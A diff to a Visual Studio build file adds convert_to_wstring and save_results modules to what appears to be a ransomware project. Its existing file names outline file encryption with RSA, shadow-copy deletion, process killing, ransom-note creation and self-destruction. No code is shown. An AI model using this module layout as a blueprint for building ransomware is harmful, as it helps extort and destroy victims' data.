@@ -138,6 +138,7 @@
     <ClCompile Include="Core\file_enc.cpp" />
     <ClCompile Include="Core\file_search.cpp" />
     <ClCompile Include="Core\rsa_enc.cpp" />
+    <ClCompile Include="Helpers\convert_to_wstring.cpp" />
     <ClCompile Include="Helpers\create_readmes.cpp" />
     <ClCompile Include="Helpers\del_shadows.cpp" />
     <ClCompile Include="Helpers\gen_str.cpp" />
@@ -145,6 +146,7 @@
     <ClCompile Include="Helpers\kill_procs.cpp" />
     <ClCompile Include="Helpers\msg_screen.cpp" />
     <ClCompile Include="Helpers\profiler.cpp" />
+    <ClCompile Include="Helpers\save_results.cpp" />
     <ClCompile Include="Helpers\self_dest.cpp" />
     <ClCompile Include="Helpers\system_id.cpp" />
     <ClCompile Include="main.cpp" />
@@ -158,6 +160,7 @@
     <ClInclude Include="Core\file_enc.h" />
     <ClInclude Include="Core\file_search.h" />
     <ClInclude Include="Core\rsa_enc.h" />
+    <ClInclude Include="Helpers\convert_to_wstring.h" />
     <ClInclude Include="Helpers\create_readmes.h" />
     <ClInclude Include="Helpers\del_shadows.h" />
     <ClInclude Include="Helpers\gen_str.h" />
@@ -167,6 +170,7 @@
     <ClInclude Include="Helpers\merge_dics.h" />
     <ClInclude Include="Helpers\msg_screen.h" />
     <ClInclude Include="Helpers\profiler.h" />
+    <ClInclude Include="Helpers\save_results.h" />
     <ClInclude Include="Helpers\self_dest.h" />
     <ClInclude Include="Helpers\system_id.h" />
   </ItemGroup>
